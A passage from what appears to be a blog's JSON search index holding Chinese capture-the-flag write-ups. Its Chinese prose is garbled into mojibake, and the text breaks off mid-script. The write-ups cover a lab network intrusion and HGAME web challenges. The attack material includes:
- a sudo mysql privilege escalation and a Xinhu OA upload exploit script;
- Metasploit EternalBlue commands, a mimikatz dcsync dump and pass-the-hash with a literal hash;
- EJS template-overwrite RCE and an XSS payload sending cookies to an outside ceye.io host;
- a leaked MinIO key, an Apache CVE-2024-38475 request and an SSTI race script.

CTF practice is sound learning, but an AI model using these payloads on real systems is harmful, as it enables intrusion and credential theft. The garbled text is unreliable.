)\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: 